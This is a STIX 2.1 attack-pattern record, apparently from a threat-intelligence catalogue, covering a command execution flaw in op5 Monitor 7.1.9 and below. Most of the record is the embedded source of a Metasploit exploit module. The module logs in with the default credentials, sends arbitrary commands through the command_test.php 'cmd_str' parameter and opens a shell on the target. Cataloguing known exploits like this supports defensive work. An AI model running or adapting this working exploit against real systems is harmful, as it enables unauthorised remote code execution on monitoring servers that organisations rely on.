{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2d5c8795-bb19-42fa-8749-ca42f01f27c7",
    "created": "2024-08-14T17:04:14.731436Z",
    "modified": "2024-08-14T17:04:14.73144Z",
    "name": "op5 v7.1.9 Configuration Command Execution",
    "description": "( op5 an open source network monitoring software. The configuration page in version 7.1.9 and below allows the ability to test a system command, which can be abused to run arbitrary code as an unpriv user. )",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/op5_config_exec.rb",
            "external_id": "op5_config_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.op5.com/blog/news/op5-monitor-7-2-0-release-notes/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  Rank = ExcellentRanking\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name'        => 'op5 v7.1.9 Configuration Command Execution',\n        'Description' => %q(\n          op5 an open source network monitoring software.\n          The configuration page in version 7.1.9 and below\n          allows the ability to test a system command, which\n          can be abused to run arbitrary code as an unpriv user.\n        ),\n        'Author'      =>\n          [\n            'h00die <mike@shorebreaksecurity.com>', # module\n            'hyp3rlinx'                        # discovery\n          ],\n        'References'  =>\n          [\n            [ 'EDB', '39676' ],\n            [ 'URL', 'https://www.op5.com/blog/news/op5-monitor-7-2-0-release-notes/']\n          ],\n        'License'        => MSF_LICENSE,\n        'Platform'       => ['linux', 'unix'],\n        'Privileged'     => false,\n        'DefaultOptions' => { 'SSL' => true },\n        'Targets'        =>\n          [\n            [ 'Automatic Target', {}]\n          ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2016-04-08'\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptString.new('USERNAME', [ true, 'User to login with', 'monitor']),\n        OptString.new('PASSWORD', [ false, 'Password to login with', 'monitor']),\n        OptString.new('TARGETURI', [ true, 'The path to the application', '/'])\n      ], self.class\n    )\n  end\n\n  def check\n    begin\n      res = send_request_cgi(\n        'uri'       => normalize_uri(target_uri.path),\n        'method'    => 'GET'\n      )\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n      /Version: (?<version>[\\d]{1,2}\\.[\\d]{1,2}\\.[\\d]{1,2})[\\s]+\\|/ =~ res.body\n\n      if version && Rex::Version.new(version) <= Rex::Version.new('7.1.9')\n        vprint_good(\"Version Detected: #{version}\")\n        Exploit::CheckCode::Appears\n      else\n        Exploit::CheckCode::Safe\n      end\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{peer} - Could not connect to the web service\")\n    end\n  end\n\n  def exploit\n    execute_cmdstager(\n      :flavor  => :echo\n    )\n  end\n\n  def execute_command(cmd, opts)\n    begin\n      # To manually view the vuln page, click Manage > Configure > Commands.\n      # Click the \"Test this command\" button to display the form we abuse.\n\n      # login\n      res = send_request_cgi(\n        'uri'       => normalize_uri(target_uri.path, 'monitor/index.php/auth/login'),\n        'method'    => 'POST',\n        'vars_get'  =>\n        {\n          'uri' => 'tac/index'\n        },\n        'vars_post' =>\n        {\n          'csrf_token' => '',\n          'username'   => datastore['USERNAME'],\n          'password'   => datastore['PASSWORD']\n        }\n      )\n\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Invalid credentials (response code: #{res.code})\") if res.code != 302\n      cookie = res.get_cookies\n      # exploit\n      res = send_request_cgi(\n        'uri'       => normalize_uri(target_uri.path, 'monitor/op5/nacoma/command_test.php'),\n        'method'    => 'GET',\n        'cookie'    => cookie,\n        'vars_get'  =>\n        {\n          'cmd_str' => cmd\n        }\n      )\n\n      # success means we hang our session, and wont get back a response\n      if res\n        fail_with(Failure::UnexpectedReply, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n        fail_with(Failure::UnexpectedReply, \"#{peer} - Credentials need additional privileges\") if res.body =~ /Access Denied/\n      end\n\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{peer} - Could not connect to the web service\")\n    end\n  end\n\n  def on_new_session(session)\n    super\n    session.shell_command_token('setsid $SHELL')\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-04-08",
    "x_mitre_platforms": [
        "['linux', 'unix']"
    ]
}